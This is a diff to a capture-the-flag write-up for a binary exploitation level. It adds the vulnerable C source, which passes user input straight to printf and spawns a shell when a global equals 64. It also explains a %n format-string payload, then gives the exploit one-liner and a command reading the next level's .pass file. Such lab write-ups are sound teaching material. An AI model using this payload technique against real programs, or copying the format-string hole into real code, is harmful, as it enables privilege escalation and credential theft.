@@ -1,3 +1,28 @@
+# Level3
+
+## Code
+```
+#include <stdio.h>
+
+int m;
+
+void v(void) {
+    char buffer[512];
+    fgets(buffer, 512, stdin);
+    printf(buffer);
+    if (m == 64) {
+        fwrite("Wait what?!\n", 1, 12, stdout);
+        system("/bin/sh");
+    }
+}
+
+int main(void) {
+    v();
+}
+```
+
+## Explanation
+
 - In this level, we still have a binary that takes user input and prints it immediately after.
 
 - This time, the program uses fgets, which is a much more secure way of getting user input since it
@@ -40,12 +65,15 @@
 - The test we did earlier with AAAA helped us understand the beginning of the buffer corresponded to
     the fourth "%X" we gave as input, so here's the strategy to build our payload:
 
-            4 bytes of the variable address we need to modify
-        +   3 "%x" specifiers to jump to the address where our variable address is
-        +   as many "A" (or any other) characters as needed to get to a total of 64
-        +   a "%n" specifier to write "64" at the address given as "parameter"
+    +   4 bytes of the variable address we need to modify
+    +   3 "%x" specifiers to jump to the address where our variable address is
+    +   as many "A" (or any other) characters as needed to get to a total of 64
+    +   a "%n" specifier to write "64" at the address given as "parameter"
 
 Knowing all that, here's our final payload :
 
-    (python -c 'print "\x8c\x98\x04\x08" + "%x" * 3 + "A" * 41 + "%n"' ; cat) | ./level3
-
+## Exploit
+```
+$   (python -c 'print "\x8c\x98\x04\x08" + "%x" * 3 + "A" * 41 + "%n"' ; cat) | ./level3
+$   cat /home/user/level4/.pass
+```
